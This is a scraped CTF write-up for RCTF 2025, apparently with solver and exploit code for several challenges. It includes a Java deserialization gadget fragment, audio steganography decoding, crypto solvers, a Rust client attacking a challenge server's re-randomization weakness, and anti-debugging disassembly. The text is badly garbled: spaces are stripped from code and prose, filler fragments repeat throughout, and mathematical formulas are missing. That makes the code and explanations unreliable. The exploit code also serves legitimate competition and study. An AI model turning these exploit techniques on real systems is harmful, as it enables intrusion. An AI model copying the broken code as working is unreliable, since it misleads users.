Objectnode=nodeCons.newInstance(v1,newObject[0],null); Objectright=nodeCons.newInstance(v2,newObject[0], node); ReflectionHelper.setFieldValue(node,"right", right); ReflectionHelper.setFieldValue(m,"root", node); TreeSetset=newTreeSet(); ReflectionHelper.setFieldValue(set,"m", m); returnset; }}

ounter(lineounter(lineounter(lineounter(line1.8ssDGBTssUI2.r1783.https://mateusz.viste.fr/mateusz.ogg4.16TofYbGd86C7S6JuAuhGkX4fbmC9QtzwT

ounter(line8ssDGBTssUI

ounter(linehttps://www.vogons.org/viewtopic.php?t=44947

ounter(linesvn cosvn://svn.mateusz.fr/dosmid dosmid-svn

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineroot@DESKTOP-LV8V93U:/home/2025RCTF/dosmid-svn
# svn log-r200:
350|egrep-i "playlist|m3u|freeze|empty|loop|soft"freezed v0.9totagsfreezed v0.9.1totagssequential playingofplaylists, inspiredbya patch proposedbyGraham Wisemanfreezed v0.9.2intotagsfreezed v0.9.3totagsm3u playlist uses fio calls insteadoffopen()andfriendsfix:/random was always playingfirstsongofthe m3u list, now itisrandomfromthestartfixed playlist gap delay computation (fixed/delay behavior, too)freezed v0.9.4totagsfreezed v0.9.5totagsroot@DESKTOP-LV8V93U:/home/2025RCTF/dosmid-svn
# svn log-r1:
200|egrep-i "playlist|m3u|freeze|empty|loop|soft"donotfreezewhennoMPU401isrespondingsetting volumeinsoftware again, reinstateddefaultdelay=2ms, improved keyboard reaction timesandadjusted documentationadded INT28h powersaving during idle loopsdetectingwhena playlistispassedoncommand-line (butnom3u support yet)firstsemi-experimental M3U supportfreezed v0.6intotagsfreezed v0.6.1intotagsfreezed v0.7intagsfreezed v0.8intotagsadded anemptyandself-documented configuration file2s silence gapisinsertedonlyinplaylist mode (noreasontowait2sfora single file)fixed freezingwhenfedwithanemptyplaylistif too many'soft'errors occurinarow, dosmid aborts (protects against'soft errors loops', typicallywithplaylist filledwithnon-existing files)adda note aboutemptytitles,whennotextual data could be foundinthe midi fileignoreleadingemptytitle linesfreezed v0.9totagsroot@DESKTOP-LV8V93U:/home/2025RCTF/dosmid-svn
# svn log-r1:
200|grep-n "soft"260:
setting volumeinsoftware again, reinstateddefaultdelay=2ms, improved keyboard reaction timesandadjusted documentation712:if too many'soft'errors occurinarow, dosmid aborts (protects against'soft errors loops', typicallywithplaylist filledwithnon-existing files)root@DESKTOP-LV8V93U:/home/2025RCTF/dosmid-svn
# svn log-r1:
200|sed-n'710,720p'r178|mv_fox|2016-05-0901:21:38+0800(Mon,09May2016)|1lineif too many'soft'errors occurinarow, dosmid aborts (protects against'soft errors loops', typicallywithplaylist filledwithnon-existing files)------------------------------------------------------------------------r179|mv_fox|2016-05-0901:25:49+0800(Mon,09May2016)|1linereplaced sleep() callswithequivalent udelay() calls (makes thebinary128bytes lighter)------------------------------------------------------------------------r180|mv_fox|2016-05-1002:04:00+0800(Tue,10May2016)|1linefetching more textual datafromMIDI files (text events, tracks titles, marker events...)anddisplaying itona little scrollingwindow

ounter(liner178

ounter(lineounter(lineounter(lineounter(line主页里想联系我吗？我的电子邮件地址与此网页的地址几乎相同（firstname@lastname.fr）。令人惊讶的是，很多人难以念出我的名字，所以这里附上我的名字（图片来自 Wikimedia）。https://mateusz.viste.fr/mateusz.ogg

ounter(linegopher://gopher.viste.fr

ounter(line16TofYbGd86C7S6JuAuhGkX4fbmC9QtzwT

ounter(linehttps://www.spammimic.com

ounter(lineDon't just listen to the sound; this file is hiding an 'oldrelic.' Try looking for the 'comments' that the player isn't supposedtosee.

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line#!/usr/bin/env python3
# -*- coding: utf-8 -*-"""Decode hidden message from feel.wav binary-bar waveform.Expected output: I Feel Fantastic heyheyhey"""importnumpyasnpfromscipy.ioimportwavfiledefread_mono_pcm(path:
str): rate, data = wavfile.read(path) data = data.astype(float) ifdata.ndim >1: # 立体声只取一个声道 data = data[:,0] returnrate, datadefcompute_envelope(data: np.ndarray, window_size:
int=100) -> np.ndarray: """对绝对值做滑动平均，得到能量包络""" abs_data = np.abs(data) n =len(abs_data) // window_size * window_size reshaped = abs_data[:n].reshape(-1, window_size) env = reshaped.mean(axis=1) returnenvdefbinarize_envelope(env: np.ndarray) -> np.ndarray: """根据能量双峰分布自动求阈值，得到 0/1 序列""" median_env = np.median(env) low_level = np.median(env[env < median_env]) high_level = np.median(env[env > median_env]) threshold = (low_level + high_level) /2.0 bits_raw = (env > threshold).astype(int) returnbits_rawdefrun_length_encode(bits: np.ndarray): runs = [] current = bits[0] length =1 forbinbits[1:]: ifb == current: length +=1 else: runs.append((current, length)) current = b length =1 runs.append((current, length)) returnrunsdefexpand_runs_to_bits(runs): """ 每一串 0/1 在时间上会持续若干个“单位长度”， 大部分长度约是 22 的倍数，这里固定 base_unit = 22， 再按 round(length / base_unit) 还原成重复 bit。 """ base_unit =22.0
# 针对 feel.wav 这题是固定的 bit_list = [] forv, linruns: n =int(round(l / base_unit)) ifn <=0: n =1 bit_list.extend([v] * n) returnbit_listdefbits_to_ascii(bit_list): bitstr ="".join(str(b)forbinbit_list) bitstr = bitstr[:
len(bitstr) //8*8] # 截断到 8 的倍数 bytes_vals = [int(bitstr[i : i +8],2)foriinrange(0,len(bitstr),8)] msg ="".join(chr(b)forbinbytes_vals) returnmsg, bytes_vals, bitstrdefdecode_hidden_message(path:
str): rate, data = read_mono_pcm(path) env = compute_envelope(data, window_size=100) bits_raw = binarize_envelope(env) runs = run_length_encode(bits_raw) bit_list = expand_runs_to_bits(runs) msg, bytes_vals, bitstr = bits_to_ascii(bit_list) returnmsg, bytes_vals, bitstrif__name__ =="__main__": # 把这里改成你的文件名（与脚本在同一路径下） wav_path ="feel.wav" msg, bytes_vals, bitstr = decode_hidden_message(wav_path) print("Decoded bytes:", bytes_vals) print("Decoded message:") print(msg)

ounter(lineIFeel Fantastic heyheyhey

ounter(linehttps://archive.org/details/youtube-rLy-AwdCOmI

ounter(lineounter(lineounter(linerLy-AwdCOmICreepyblog2009-04-15

ounter(lineounter(lineounter(linehttps://androidworld.com/prod68.htmChrisWillis2004

ounter(linehttps://www.findagrave.com/memorial/63520325/john-louis-bergeron

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineimport base64, jsonfrom Crypto.Cipher import AESaesKey_b64 ="WzUsMTM5LDI0NSwyMjAsMjMxLDQ2LDIzNCwxNDYsMjQ4LDIxMSwyLDIxMywyLDE2NSw5OCwxMTgsMTAzLDE2MiwzLDE1MCw0LDUzLDE3OSwxOTQsODQsMjA3LDQ1LDI0NSw4OCwxNzksMTkzLDEwMV0="aesIV_b64 ="WzEyNCwyMzIsMjU0LDE5LDI1MCw0OSw1MCw4MywyMjksMjQ0LDI4LDIyMiw4MywzMywyMDIsNl0="data_b64 ="N2M3N2ZlN2ExYTdhZGMxY2E3MmZhMzY4MzgxMjUxMjQ5ZDZlYjAwNDQwZWJhYmQ2ZDc4MTVkMjE2OTVmMjAwNzRkY2JmYjgwYmExZTVjMjc5ZWY1NzZhNTQxMTU2YTQxZGI0NjQ3MGNlYTIzMDVkOTFlNDcxN2MyMTljNGQwNWJhYjRlMGQ5Zjg1MTA5MDNmZGQyNTM1M2ZjODI5NmY3MjgxYTEyODNkODIzMDQ1Y2NkYTI4MDI3OTc2NTljNzUzNzI0M2U0MmRhMTQ4MGY4ZDg0ZWQ2YTRjMDA1MjUyNWRjYWIwMDk2M2MyODA1MGJmNTEzNjA2NzNhODdiOTNiZDg1NTNkNWU3NDMzMjk3YmRkNTRiOTQyMjJjZDUzMzg3NzIwMmYwNTU0MDNiMjRlODU5NzkwY2Q5MzliYTZjNGVmMDNjMTkzYTU0Zjc3NTUyY2MyYzJhOThlMmI3NDhmZWViZGY0ZDc5YTM5YzBkZGFlZjUyMzVmZjY4YWYxM2Y0NjFiYTkzMTAwMjhhODY3NWEzOGNiNGU3MTc0YmY1Y2QwYzY4YzdiOGE5NjczMGNlMTEyMGJjNWRjNWQ3ZDNiNGY0NTkxMzc1MGRiNzJiZjQ3NzU5YWQwNGRiOWQxYTBlYjlhMzRmOGZlNDZmMDM5OGI1YWI5YWMzMDBiZTlkNmU1MTA4ZTM1ZWQ2YTRiYTA1MTJmNjJkMjM1YTc1YzQyMTc2MGFkOWNlZWU3YWYyYjM4OTk1MjYxZGJkY2E1NDZk=="data_hex = base64.b64decode(data_b64).decode()
# 1. Base64 decodekey_list = json.loads(base64.b64decode(aesKey_b64).decode())iv_list = json.loads(base64.b64decode(aesIV_b64).decode())
# 2. Convert to byteskey_bytes = bytes(key_list)iv_bytes = bytes(iv_list)
# 3. data hex → bytescipher_bytes = bytes.fromhex(data_hex)
# 4. AES-CBC decryptcipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)plaintext = cipher.decrypt(cipher_bytes)
# 5. remove PKCS7 paddingpad = plaintext[-1]plaintext = plaintext[:-pad]print(plaintext.decode(errors="ignore"))

环：，其中

多项式生成：随机生成两个 41-稀疏、次数的多项式

平移变换：，（为随机平移量）

输出内容：

然后就是AES的CTR模式加密

（环内除法）

均为 41-稀疏多项式

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linefromsage.allimport*fromCrypto.CipherimportAESfromhashlibimportmd5r, d =16381,41R.<x> = GF(2)[]S.<X> = R.quotient(x^r -1)M = x^r -1BMAX = r//3nonce =b"suanp01y"line1, line2 =open("output.txt","r").read().splitlines()Hstr = line1.split("=",1)[1].strip() H = S(Hstr) ct =bytes.fromhex(line2.strip())defwt_R(poly_R): returnsum(int(c)forcinpoly_R.list())defeea_ratrec(F_R, M_R, B): r0, r1 = M_R, F_R s0, s1 = R(1), R(0) t0, t1 = R(0), R(1) deftry_pair(A, B): ifAandBandA.degree() <= BMAXandB.degree() <= BMAX: A, B = A.monic(), B.monic() if((F_R*B - A) % M_R) ==0: returnA, B returnNone cand = try_pair(r1, t1) ifcand:
returncand whiler1 !=0: q, r2 = r0.quo_rem(r1) r0, r1 = r1, r2 s0, s1 = s1, s0 - q*s1 t0, t1 = t1, t0 - q*t1 cand = try_pair(r0, t0) ifcand:
returncand cand = try_pair(r1, t1) ifcand:
returncand raiseRuntimeError("no bounded solution")t0_R = t1_R =Nonegood_delta =Nonefordeltainrange(r): H_delta = S(X^delta) * H F_delta = H_delta.lift() try: A, B = eea_ratrec(F_delta, M, BMAX) exceptRuntimeError: continue ifwt_R(B) == dorwt_R(A) == d: t0_R, t1_R = (B, A)ifwt_R(B) == delse(A, B) good_delta = delta print(f"[+] 找到可重构的 δ ={delta}，wt(t0)={wt_R(t0_R)}, wt(t1)={wt_R(t1_R)}") breakift0_RisNone: raiseSystemExit("[-] 遍历 δ 未能重构到 41-稀疏分母")defdecrypt_try(h0_S): key = md5(str(h0_S).encode()).digest() returnAES.new(key=key, nonce=nonce, mode=AES.MODE_CTR).decrypt(ct)t0_S = S(t0_R)flag =Noneforkinrange(r): h0 = S(X^k) * t0_S pt = decrypt_try(h0) ifpt.startswith(b"RCTF{")andpt.rstrip().endswith(b"}")andall(32<= b <=126forbinpt): flag = pt.decode() print("[+] FOUND flag:", flag) break"""[+] 找到可重构的 δ = 12921 ，wt(t0)=41, wt(t1)=41[+] FOUND flag: RCTF{i_just_h0pe_ChatGPT_doesnt_inst@ntly_so1ve_thi5_one.}"""

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line[package]name ="exp"version ="0.1.0"edition ="2024"[dependencies]ark-bls12-381 ="0.5"ark-ec ="0.5"ark-ff ="0.5"ark-serialize ="0.5"hex ="0.4"

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineuse std::io::{Read, Write};use std::
net::
TcpStream;use ark_bls12_381::{Bls12_381, Fr, G1Affine, G1Projective, G2Affine, G2Projective};use ark_ec::{pairing::
Pairing, CurveGroup, PrimeGroup};use ark_ff::{PrimeField, Field};use ark_serialize::{CanonicalDeserialize, CanonicalSerialize};typeGT=::
TargetField;fnparse_g1_hex(s: &str)-> G1Projective { letb=hex::
decode(s).expect("bad hex g1"); leta=G1Affine::
deserialize_compressed(&*b).expect("bad g1"); G1Projective::
from(a)}fnparse_g2_hex(s: &str)-> G2Projective { letb=hex::
decode(s).expect("bad hex g2"); leta=G2Affine::
deserialize_compressed(&*b).expect("bad g2"); G2Projective::
from(a)}fnparse_gt_hex(s: &str)-> GT { letb=hex::
decode(s).expect("bad hex gt"); GT::
deserialize_compressed(&*b).expect("bad gt")}fnhex_g1(p: &G1Projective)-> String { let a: G1Affine = (*p).into_affine(); letmutv=Vec::
new(); a.serialize_compressed(&mut v).unwrap(); hex::
encode(v)}fnhex_g2(p: &G2Projective)-> String { let a: G2Affine = (*p).into_affine(); letmutv=Vec::
new(); a.serialize_compressed(&mut v).unwrap(); hex::
encode(v)}fnhex_gt(x: >)-> String { letmutv=Vec::
new(); x.serialize_compressed(&mut v).unwrap(); hex::
encode(v)}fnxor_in_place(a: &mut [u8], b: &[u8]){ for(x, y) in a.iter_mut().zip(b.iter()) { *x ^= *y; }}fnmain()-> std::io::
Result<()> { // 连接远端 lethost=std::
env::
args().nth(1).unwrap_or_else(||"1.14.196.78:
42601".to_string()); letmutsock=TcpStream::
connect(host)?; // 读首行 banner letmutline=String::
new(); letmutbuf=[0u8;4096]; // 读到换行即可 loop { letn=sock.read(&mut buf)?; ifn ==0{break; } line.push_str(&String::
from_utf8_lossy(&buf[..n])); ifline.contains('n') {break; } } letline=line.lines().next().unwrap().trim().to_string(); // 拆分 8 段: id|dst|pk|q|c1|c2|c3|enc_flag letmutit=line.split('|'); let_id_hex=it.next().expect("id");[图片已移除] let_dst_hex=it.next().expect("dst"); letpk_hex=it.next().expect("pk"); letq_hex=it.next().expect("q"); letc1_hex=it.next().expect("c1"); letc2_hex=it.next().expect("c2"); letc3_hex=it.next().expect("c3"); letenc_hex=it.next().expect("enc"); assert!(it.next().is_none(),"more parts than expected"); // 反序列化 let pk: GT = parse_gt_hex(pk_hex); let q: G2Projective = parse_g2_hex(q_hex); let c1: GT = parse_gt_hex(c1_hex); let c2: G1Projective = parse_g1_hex(c2_hex); let c3: G2Projective = parse_g2_hex(c3_hex); letmutenc=hex::
decode(enc_hex).expect("bad enc hex"); let mut delta_u64: u64 =1; letkey_hex=loop { letdelta=Fr::
from(delta_u64); letc1p=c1 * pk.pow(delta.into_bigint()); letc2p=c2 + G1Projective::
generator() * delta; letc3p=c3 + q * delta; letout=format!( "{}|{}|{}n", hex_gt(&c1p), hex_g1(&c2p), hex_g2(&c3p), ); sock.write_all(out.as_bytes())?; letmutresp=String::
new(); sock.read_to_string(&mut resp)?; letresp=resp.trim(); ifresp =="bad"|| resp =="no"{ delta_u64 +=1; continue; }else{ breakresp.to_string(); } }; letkey=hex::
decode(key_hex).expect("bad key hex"); letenc_len=enc.len(); assert!(key.len() >= enc_len); xor_in_place(&mut enc, &key[..enc_len]); println!("{}", String::
from_utf8_lossy(&enc)); Ok(())}

ounter(lineounter(lineounter(lineounter(lineounter(lineC:
Users28421Desktopexp>cargo run --release Compilingexpv0.1.0(C:
Users28421Desktopexp) Finished`release`profile [optimized] target(s) in1.65s Running`targetreleaseexp.exe`RCTF{ElGamal-style_re-randomization_attack_still_break_modern_schemes_7ec932b22988}

ounter(lineounter(lineHe said that ifallthe key modifications involved in anti-debugging are identified, the flag can be retrieved.your flag is RCTF{AntiDbg_KeyM0d_2025_R3v3rs3}程序执行完毕，按下任意键退出...

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040151D loc_40151D:.text:
0040151D mov ebx,22222222h.text:
00401522 mov eax, dword_404018.text:
00401527 mov [ebp-88h], eax.text:
0040152D push 0.text:
0040152F push 0.text:
00401531 push offset sub_401130 ; 回调.text:
00401536 call ds:
EnumUILanguagesA.text:
0040153C mov [ebp-194h], eax.text:
00401542 mov ecx, dword_40440C ; key 指针放到 [ebp-190h].text:
00401548 mov [ebp-190h], ecx

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040154E mov byte ptr [ebp-84h],0Fh.text:
00401555 mov byte ptr [ebp-83h],1Ah.text:
0040155C mov byte ptr [ebp-82h],8Ah.text:
00401563 mov byte ptr [ebp-81h],5Ah ;'Z'.text:
0040156A mov byte ptr [ebp-80h],22h ;'"'.text:
0040156E mov byte ptr [ebp-7Fh],0ABh.text:
00401572 mov byte ptr [ebp-7Eh],1Eh.text:
00401576 mov byte ptr [ebp-7Dh],63h ;'c'.text:
0040157A mov byte ptr [ebp-7Ch],19h.text:
0040157E mov byte ptr [ebp-7Bh],5Ah ;'Z'.text:
00401582 mov byte ptr [ebp-7Ah],87h.text:
00401586 mov byte ptr [ebp-79h],0F2h.text:
0040158A mov byte ptr [ebp-78h],0E6h.text:
0040158E mov byte ptr [ebp-77h],0E9h.text:
00401592 mov byte ptr [ebp-76h],0D7h.text:
00401596 mov byte ptr [ebp-75h],0D1h.text:
0040159A mov byte ptr [ebp-74h],97h.text:
0040159E mov byte ptr [ebp-73h],0F9h.text:
004015A2 mov byte ptr [ebp-72h],0F8h.text:
004015A6 mov byte ptr [ebp-71h],32h ;'2'.text:
004015AA mov byte ptr [ebp-70h],5Bh ;'['.text:
004015AE mov byte ptr [ebp-6Fh],0DEh.text:
004015B2 mov byte ptr [ebp-6Eh],2Dh ;'-'.text:
004015B6 mov byte ptr [ebp-6Dh],0D6h.text:
004015BA mov byte ptr [ebp-6Ch],0A3h.text:
004015BE mov byte ptr [ebp-6Bh],4Fh ;'O'.text:
004015C2 mov byte ptr [ebp-6Ah],7Eh ;'~'.text:
004015C6 mov byte ptr [ebp-69h],0CBh.text:
004015CA mov byte ptr [ebp-68h],61h ;'a'.text:
004015CE mov byte ptr [ebp-67h],0B2h.text:
004015D2 mov byte ptr [ebp-66h],3Fh ;'?'.text:
004015D6 mov byte ptr [ebp-65h],0BFh.text:
004015DA mov byte ptr [ebp-64h],0B7h.text:
004015DE mov byte ptr [ebp-63h],1Bh.text:
004015E2 mov byte ptr [ebp-62h],0Ah.text:
004015E6 mov byte ptr [ebp-61h],84h.text:
004015EA mov byte ptr [ebp-60h],0B3h.text:
004015EE mov byte ptr [ebp-5Fh],0B4h.text:
004015F2 mov byte ptr [ebp-5Eh],0DEh.text:
004015F6 mov byte ptr [ebp-5Dh],3.text:
004015FA mov byte ptr [ebp-5Ch],46h ;'F'.text:
004015FE mov byte ptr [ebp-5Bh],7Bh ;'{'.text:
00401602 mov byte ptr [ebp-5Ah],83h.text:
00401606 mov byte ptr [ebp-59h],0F0h.text:
0040160A mov byte ptr [ebp-58h],0C4h.text:
0040160E mov byte ptr [ebp-57h],0B3h.text:
00401612 mov byte ptr [ebp-56h],0ABh.text:
00401616 mov byte ptr [ebp-55h],7Bh ;'{'.text:
0040161A mov byte ptr [ebp-54h],29h ;')'.text:
0040161E mov byte ptr [ebp-53h],0BCh.text:
00401622 mov byte ptr [ebp-52h],1Fh.text:
00401626 mov byte ptr [ebp-51h],0FEh.text:
0040162A mov byte ptr [ebp-50h],8Ah.text:
0040162E mov byte ptr [ebp-4Fh],79h ;'y'.text:
00401632 mov byte ptr [ebp-4Eh],26h ;'&'.text:
00401636 mov byte ptr [ebp-4Dh],0DAh.text:
0040163A mov byte ptr [ebp-4Ch],8.text:
0040163E mov byte ptr [ebp-4Bh],1.text:
00401642 mov byte ptr [ebp-4Ah],85h.text:
00401646 mov byte ptr [ebp-49h],66h ;'f'.text:
0040164A mov byte ptr [ebp-48h],7Dh ;'}'.text:
0040164E mov byte ptr [ebp-47h],0BBh.text:
00401652 mov byte ptr [ebp-46h],0EEh.text:
00401656 mov byte ptr [ebp-45h],0Fh.text:
0040165A mov byte ptr [ebp-44h],89h.text:
0040165E mov byte ptr [ebp-43h],59h ;'Y'.text:
00401662 mov byte ptr [ebp-42h],0D4h.text:
00401666 mov byte ptr [ebp-41h],5Fh ;'_'.text:
0040166A mov byte ptr [ebp-40h],0ACh.text:
0040166E mov byte ptr [ebp-3Fh],18h.text:
00401672 mov byte ptr [ebp-3Eh],0AEh.text:
00401676 mov byte ptr [ebp-3Dh],0Bh.text:
0040167A mov byte ptr [ebp-3Ch],4Eh ;'N'.text:
0040167E mov byte ptr [ebp-3Bh],0F0h.text:
00401682 mov byte ptr [ebp-3Ah],0B7h.text:
00401686 mov byte ptr [ebp-39h],5.text:
0040168A mov byte ptr [ebp-38h],5Ch ;''.text:
0040168E mov byte ptr [ebp-37h], 81h.text:
00401692 mov byte ptr [ebp-36h], 4.text:
00401696 mov byte ptr [ebp-35h], 9Fh.text:
0040169A mov byte ptr [ebp-34h], 0A4h.text:
0040169E mov byte ptr [ebp-33h], 1Ch.text:
004016A2 mov byte ptr [ebp-32h], 5Dh ; ']'.text:
004016A6 mov byte ptr [ebp-31h], 0A0h.text:
004016AA mov byte ptr [ebp-30h], 0B9h.text:
004016AE mov byte ptr [ebp-2Fh], 7.text:
004016B2 mov byte ptr [ebp-2Eh], 92h.text:
004016B6 mov byte ptr [ebp-2Dh], 5Ch ; ''.text:
004016BA mov byte ptr [ebp-2Ch], 8Ah.text:
004016BE mov byte ptr [ebp-2Bh], 53h ; 'S'

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040175A push 80h ; key 长度0x80.text:
0040175F mov edx, [ebp-190h] ; key 指针 = dword_40440C.text:
00401765 push edx.text:
00401766 lea eax, [ebp-18Ch] ; RC4 state.text:
0040176C push eax.text:
0040176D call sub_4017D0 ; RC4 KSA.text:
00401772 add esp,0Ch.text:
00401775 push 80h.text:
0040177A lea ecx, [ebp-84h] ; 密文缓冲.text:
00401780 push ecx.text:
00401781 lea edx, [ebp-18Ch] ; RC4 state.text:
00401787 push edx.text:
00401788 call sub_4018A0 ; RC4 PRGA + XOR.text:
0040178D add esp,0Ch.text:
00401790 lea eax, [ebp-84h].text:
00401796 push eax.text:
00401797 push offset aYourFlagIsS ;"your flag is %s".text:
0040179C call sub_401050

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.data:
0040400B db0FFh.data:
0040400C dword_40400C dd1 ;DATA XREF: sub_40206D+2↑r.data:
00404010dword_404010 dd1 ;DATA XREF: sub_4022F5+D↑w.data:
00404010 ;sub_4022F5:
loc_402409↑r ....data:
00404014dword_404014 dd1 ;DATA XREF: sub_4024C6+2↑r.data:
00404018dword_404018 dd12345678h ;DATA XREF: .text:
00401522↑r.data:
0040401C aFlagTh1sflagls db'flag:{Th1sflaglsG00ds}',0.data:
00404033 db 0.data:
00404034 db 0.data:
00404035 db 0.data:
00404036 db 0.data:
00404037 db 0.data:
00404038 db 0

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
00401440sub_401440 proc near ;CODE XREF: .text:
004010F1↑p....text:
0040144D push 0 ; lpModuleName =NULL.text:
0040144F call ds:
GetModuleHandleA.text:
00401455 mov [ebp+var_8], eax ; 模块基址.text:
00401458 mov [ebp+var_4],0.text:
0040145F jmp short loc_40146A.text:
00401461loc_401461:.text:
00401461 mov eax, [ebp+var_4].text:
00401464 add eax,1.text:
00401467 mov [ebp+var_4], eax.text:
0040146A loc_40146A:.text:
0040146A cmp [ebp+var_4],10000h.text:
00401471 jnb short loc_4014AA.text:
00401473 mov ecx, [ebp+var_8].text:
00401476 add ecx, [ebp+var_4].text:
00401479 mov edx, [ecx] ; 取一个 dword.text:
0040147B mov [ebp+var_C], edx.text:
0040147E cmp [ebp+var_C],12345678h.text:
00401485 jnz short loc_4014A8.text:
00401487 mov eax, [ebp+var_8].text:
0040148A add eax, [ebp+var_4].text:
0040148D movsx ecx, byte ptr [eax+4].text:
00401491 cmp ecx,75h ;'u'.text:
00401494 jz short loc_4014A8.text:
00401496 mov edx, [ebp+var_4].text:
00401499 mov eax, [ebp+var_8].text:
0040149C lea ecx, [eax+edx+4].text:
004014A0 mov dword_40440C, ecx ; 保存指针.text:
004014A6 jmp short loc_4014AA.text:
004014AA loc_4014AA:.text:
004014AA mov eax, dword_40440C.text:
004014AF mov esp, ebp.text:
004014B1 pop ebp.text:
004014B2 retn

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
004010DA loc_4010DA:.text:
004010DA mov ebx,22222222h.text:
004010DF mov byte ptr [ebp-5],1.text:
004010E3 push eax.text:
004010E4 mov eax,large fs:
30h ; PEB.text:
004010EA mov al, [eax+2] ; BeingDebugged.text:
004010ED mov [ebp-5], al.text:
004010F0 pop eax.text:
004010F1 call sub_401440 ; 设置 dword_40440C.text:
004010F6 mov dword_404408,8.text:
00401100 movzx eax, byte ptr [ebp-5].text:
00401104 test eax, eax.text:
00401106 jz short loc_40110A ; 未调试 -> 改 key.text:
00401108 jmp short loc_401119.text:
0040110A loc_40110A:.text:
0040110A mov ecx, dword_40440C.text:
00401110 add ecx, dword_404408 ; +8.text:
